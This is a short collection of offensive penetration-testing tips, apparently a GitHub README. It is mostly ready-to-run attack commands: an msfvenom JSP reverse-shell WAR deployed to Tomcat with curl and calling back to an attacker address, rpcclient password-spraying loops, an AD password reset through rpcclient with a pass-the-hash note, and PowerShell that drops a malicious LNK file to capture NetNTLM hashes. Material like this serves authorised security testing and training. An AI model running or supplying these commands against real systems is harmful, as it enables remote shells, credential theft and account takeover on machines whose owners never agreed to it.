# PenTips
Offensive security & penetration testing tips

### Tip 1
##### Tomcat
**Subject** : Deploy a new application archive (WAR) remotely without manager-gui role using curl.
<br/>Required roles : **manager-script** (tomcat-users.xml).
<br/>(By default, no user is included in the "manager-gui" role required to operate the "/manager/html" web application).

If the Host is configured with *unpackWARs=true* (server.xml) and you deploy a war file, it will be unpacked into a directory in your Host appBase directory.
<br/>`<Host name="localhost"  appBase="webapps" unpackWARs="true" autoDeploy="true">`

In order to produce a new application archive (WAR) containing JSP reverse shell, you can use **msf-venom**.
<br/>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f war > rev.war`

Deploy new application archive (WAR) remotely using curl.
<br/>`curl -X PUT -T rev.war http://tomcat:password@10.10.10.50:8080/manager/text/deploy?path=/applicationname`

Access new application archive to execute the JSP payload.
<br/>`curl -u 'tomcat':'password' http://10.10.10.50:8080/applicationname/vnmsydlc.jsp`

### Tip 2
##### RPC password spraying

while read x; do echo $x; rpcclient -U “DOMAIN/$x%PasswOrd123” -c “getusername;quit” 192.168.0.110; done < ./userlist.txt

Using bash script:
<br/>`#/bin/bash`
<br/>`for u in 'cat dom_users.txt'`
<br/>`do echo -n "[*] user: $u" && rpcclient -U "$u%password" -c "getusername;quit" 10.10.10.192`
<br/>`done`

### Tip 3
##### AD user password modification using rpcclient
`user@host # rpcclient -U supportAccount //192.168.0.100`
<br/>[...] authenticate using the supportAccount password which needs to be modified
<br/>`rpcclient $> setuserinfo2 supportAccount 23 SuperNewPassword22`

--> Note : If package passing-the-hash is installed on attacker machine, you can even do this with just a NTLM hash. (Flag : --pw-nt-hash)

### Tip 4
##### Drop malicious LNK file on share to retrieve NetNTLM hashes
```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")
$lnk.TargetPath = "\\<attackerIP>\@file.txt"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "LNK file"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
